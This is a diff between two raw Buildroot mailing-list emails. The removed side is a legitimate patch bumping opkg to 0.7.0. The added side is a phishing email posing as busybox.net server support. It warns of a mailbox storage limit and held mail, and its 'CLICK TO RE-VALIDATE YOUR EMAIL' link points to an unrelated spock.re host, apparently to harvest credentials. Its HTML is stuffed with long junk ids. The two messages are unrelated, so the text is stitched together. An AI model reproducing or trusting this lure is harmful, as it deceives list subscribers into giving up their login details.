@@ -1,94 +1,51 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3F7ABD11195
-	for <buildroot@archiver.kernel.org>; Sun,  3 Nov 2024 22:13:52 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 66CE3D11194
+	for <buildroot@archiver.kernel.org>; Sun,  3 Nov 2024 23:52:15 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 049DE80DD3;
-	Sun,  3 Nov 2024 22:13:52 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp1.osuosl.org ([127.0.0.1])
- by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id WmXQK2PWEHQM; Sun,  3 Nov 2024 22:13:51 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org F3BC480E0E
-Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp1.osuosl.org (Postfix) with ESMTP id F3BC480E0E;
-	Sun,  3 Nov 2024 22:13:50 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by lists1.osuosl.org (Postfix) with ESMTP id ABD081DD6
- for <buildroot@buildroot.org>; Sun,  3 Nov 2024 22:13:47 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 8B43740329
- for <buildroot@buildroot.org>; Sun,  3 Nov 2024 22:13:47 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id EE831401D4;
+	Sun,  3 Nov 2024 23:52:14 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
  by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id ANOVWba4FhSH for <buildroot@buildroot.org>;
- Sun,  3 Nov 2024 22:13:46 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2a00:1450:4864:20::32c; helo=mail-wm1-x32c.google.com;
- envelope-from=romain.naour@smile.fr; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org 8EB0E40102
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 8EB0E40102
-Received: from mail-wm1-x32c.google.com (mail-wm1-x32c.google.com
- [IPv6:2a00:1450:4864:20::32c])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 8EB0E40102
- for <buildroot@buildroot.org>; Sun,  3 Nov 2024 22:13:45 +0000 (UTC)
-Received: by mail-wm1-x32c.google.com with SMTP id
- 5b1f17b1804b1-4315e62afe0so31604775e9.1
- for <buildroot@buildroot.org>; Sun, 03 Nov 2024 14:13:45 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1730672023; x=1731276823;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=IZ4Q5w6oHv+S/LIHQf/whVq7Nk7O42+CJRGoW1nWdoI=;
- b=GIce8VMWamIANJzFE40CPXe5kBzNzOVwWS4cY3svVN8tn1K8GFi1mLZfgpWkLCGUrn
- R82UQejya3H0kft33H9jVXIm8JHwq8/D5L4hGVOhIPDlmSt/qIFY7DEQJd9tGp43sX01
- FwUoyGjxQcRE+Xt1r7jgD0auJFWqY6iRmLe2crl7iFjY41DT32nYoRqVhQQWjg9zSwKn
- yqa2j1DWfuHucrwgI+xT3DMuloHSbUNlXItE78E1i99RCWJnpVGuL7+yWCd+bi8jPEEW
- Jklk1Osy4wAN9uyQe1ixtqmn0TQcsJZ0dw6/w6wcKXo1MnlPAQco0Xs++lEywOSMKaDb
- we2A==
-X-Gm-Message-State: AOJu0Yxbo45vd3eXA4eESqfOL6KRPG5M+hgyR77lgP5t2WHBrM36+U+W
- Y2SvdEFCe+gzbtlAKdQ1wikpCmHcFcstqRRHU8KgQ9JKPcCqYyAzkNZDPk9Dvx58zSzn8PTfmDR
- 9
-X-Google-Smtp-Source: AGHT+IFWpKcvL6HH+nedS7OLn2jtUYLC3HcVAm0UTnLietNUYOuGDs9yE3L7gjd3ZIhSmvwxUtNuDQ==
-X-Received: by 2002:a05:600c:4ec7:b0:42e:93af:61c5 with SMTP id
- 5b1f17b1804b1-4319acad2e4mr270475265e9.14.1730672023105; 
- Sun, 03 Nov 2024 14:13:43 -0800 (PST)
-Received: from P-NTS-Evian.home
- (2a01cb05949d5800e3ef2d7a4131071f.ipv6.abo.wanadoo.fr.
- [2a01:cb05:949d:5800:e3ef:2d7a:4131:71f])
- by smtp.gmail.com with ESMTPSA id
- 5b1f17b1804b1-431bd8e8549sm167647645e9.10.2024.11.03.14.13.42
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Sun, 03 Nov 2024 14:13:42 -0800 (PST)
-To: buildroot@buildroot.org
-Cc: Romain Naour <romain.naour@smile.fr>
-Date: Sun,  3 Nov 2024 23:13:39 +0100
-Message-ID: <20241103221340.1770246-1-romain.naour@smile.fr>
-X-Mailer: git-send-email 2.45.0
+ id Y1ZRXhLXVMKK; Sun,  3 Nov 2024 23:52:14 +0000 (UTC)
+X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org BC7FF40246
+Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
+	by smtp4.osuosl.org (Postfix) with ESMTP id BC7FF40246;
+	Sun,  3 Nov 2024 23:52:13 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
+ by lists1.osuosl.org (Postfix) with ESMTP id 8DD3B723
+ for <buildroot@buildroot.org>; Sun,  3 Nov 2024 23:52:12 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 7B06880E0B
+ for <buildroot@buildroot.org>; Sun,  3 Nov 2024 23:52:12 +0000 (UTC)
+X-Virus-Scanned: amavis at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id Ybm-Pw39tVoL for <buildroot@buildroot.org>;
+ Sun,  3 Nov 2024 23:52:11 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.3.96.79;
+ helo=busybox.net; envelope-from=postmaster.support@busybox.net;
+ receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 7AA0E80B5C
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7AA0E80B5C
+Received: from busybox.net (unknown [192.3.96.79])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 7AA0E80B5C
+ for <buildroot@busybox.net>; Sun,  3 Nov 2024 23:52:11 +0000 (UTC)
+From: busybox.net Server Support <postmaster.support@busybox.net>
+To: buildroot@busybox.net
+Date: 4 Nov 2024 00:52:10 +0100
+Message-ID: <20241104005210.89B87040DB071E0F@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=smile.fr; s=google; t=1730672023; x=1731276823; darn=buildroot.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=IZ4Q5w6oHv+S/LIHQf/whVq7Nk7O42+CJRGoW1nWdoI=;
- b=Q4naPz+Y0lhe0CEk2h7l4cRubGDrRyjGHCUZS0Mcv7MBTNZmfy403ZNVYQIen5WOXH
- cAEI4thfkdVKca5vmvZ2JC0nQXXJzZ9LPwIkkkrAZw+ztHncVqNXCryyPUFscABQoYY/
- NLWAW+egX0JsxnkyG82v6y+oV1YE1zKI8TwYU=
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=reject dis=none)
- header.from=smile.fr
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (1024-bit key,
- unprotected) header.d=smile.fr header.i=@smile.fr header.a=rsa-sha256
- header.s=google header.b=Q4naPz+Y
-Subject: [Buildroot] [PATCH 1/2] package/opkg: bump to version 0.7.0
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] buildroot@busybox.net have 7 Pending incoming emails
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.30
 Precedence: list
@@ -100,109 +57,308 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Romain Naour via buildroot <buildroot@buildroot.org>
-Reply-To: Romain Naour <romain.naour@smile.fr>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============3698983219685555648=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Since the toolchain-external-bootlin version bump to 2024.05-1 the
-TestOpkg fail due to a "spurious error check" fixed in opkg 0.7.0 [1].
+--===============3698983219685555648==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-With toolchain-external-bootlin 2024.02-1 (gcc-12) and opkg 0.6.2:
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p>
+<table width=3D"80%" align=3D"center"=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16556" style=3D"margin: 0px; padding:=
+ 0px; color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; lette=
+r-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: sm=
+all; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: =
+normal; border-collapse: collapse; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial;">
+<tbody=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16555" style=3D"width: 613px;">
+<tr=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16554">
+<td=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16553" style=3D"margin: 0px; padding:=
+ 0px; font-family: arial, sans-serif;"><span style=3D"font-family: calibri;=
+ font-size: small;">Dear<span>&nbsp;buildroot@busybox.net</span>,<br><br><s=
+pan></span><br>
+<span style=3D"text-align: left; color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Calibri, Helvetica,=
+ sans-serif; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; background-color: rgb(255, 255, 255); text-decoration-color=
+: initial;">You have reached your E-Mail storage bandwidth limit.</span><sp=
+an>&nbsp;</span><span>&nbsp;</span>
+<span style=3D"text-align: left; color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Calibri, Helvetica,=
+ sans-serif; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; background-color: rgb(255, 255, 255); text-decoration-color=
+: initial;">Most of your incoming mails will be placed on hold.</span></spa=
+n></td></tr></tbody>
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 18px; font-family: Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif; min-width: 100%;">
+<table width=3D"100%" style=3D"border-top-color: rgb(234, 234, 234); border=
+-top-width: 2px; border-top-style: solid; border-collapse: collapse; min-wi=
+dth: 100%;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;">&nbsp;</td></tr></tbody></table></td></tr></tbody>
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px; padding: 0px 18px=
+ 18px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">
+<table style=3D"border-radius: 3px; width: 621px; border-collapse: separate=
+; background-color: rgb(62, 126, 54);" border=3D"0" cellspacing=3D"0" cellp=
+adding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 18px;=
+ width: 585px; font-family: Helvetica; font-size: 18px;"><span style=3D"fon=
+t-size: 14pt;"><a style=3D"color: rgb(17, 85, 204);" href=3D"https://018183=
+cf-fc6d-45de-b6e6-8b5f35529b0e-00-2lnxvcypyvbdo.spock.re/#buildroot@busybox=
+=2Enet" rel=3D"noopener noreferrer"><span style=3D"color: rgb(255, 255, 255=
+);"><strong>CLICK TO RE-VALIDATE YOUR EMAIL</strong></span></a></span></td>=
 
-  opkg install example-snmpd-package_1.0_arm.ipk
-  Installing example-snmpd-package (1.0) on root.
-  Configuring example-snmpd-package.
-  Starting SNMP daemon: OK
-  echo $?
-  0
+</tr></tbody></table></td></tr></tbody></table><p></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">&nbsp;</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;"></p>
+<p>
+<table width=3D"80%" align=3D"center"=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16534" style=3D"margin: 0px; padding:=
+ 0px; color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; lette=
+r-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: sm=
+all; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: =
+normal; border-collapse: collapse; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial;">
+<tbody=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16533" style=3D"width: 613px;">
+<tr=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
+0;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;07m_-6377719604102821&#10;&#10;49=
+m_-4781510750521688475m_9090864417809439104m_5166011271069647716m_620845941=
+0863836154m_-7169246405883259618m_5134272602628816941gmail-m_50844891957623=
+61700m_1532570758211924560m_-8344169056547586109m_-3367314416346414182m_-47=
+3520831546422781gmail-m_-3948200295443687294m_-908
+14433&#10;34920683415m&#10;_6874&#10;23038&#10;13549&#10;23433&#10;m_382&#1=
+0;40896&#10;48241&#10;62882&#10;7m_54&#10;20362&#10;37308&#10;26129&#10;30m=
+_3&#10;84215&#10;99762&#10;44015&#10;507m_&#10;-5209&#10;02294&#10;47183&#1=
+0;60594&#10;m_-41&#10;70766&#10;80355&#10;50117&#10;90m_-&#10;68320&#10;598=
+07&#10;52238&#10;69gmail-m_&#10;-522019964&#10;8705920322&#10;m_-3750336641=
+22181227&#10;1gmail-m_-&#10;5354923555626739022m_5460447096299416478m_28819=
+55897773493902m_-4547016577787551694gmail-m_595969
+2308029045&#10;15&#10;9m_-257047&#10;7435948253&#10;719gmail-y&#10;ui_3_16_=
+0_&#10;ym19_1_150&#10;5675176642&#10;_16532">
+<td=20
+id=3D"m_-6041374208950878564m_-277016600900157489m_-6183260455915426384gmai=
+l-m_-1542263512170498739m_1901085614000399242m_2920291785689273808gmail-yiv=
+3707143884gmail-m_4346880456886970578gmail-ydpa892b7bcyiv6010753391m_553675=
+9907073434736m_8552970627222572634m_-3753882876049232821m_-6491405279578156=
+244m_-4240513373457070104m_-765871393602979673m_-4697919852157321175m_-6849=
+027622176941974m_-9125066668125318274m_-3244513947275359391m_88260207626462=
+35588m_-3654408439621496537m_-7161799209864197797gma
+&#10;il-m_88671340945119430&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#1=
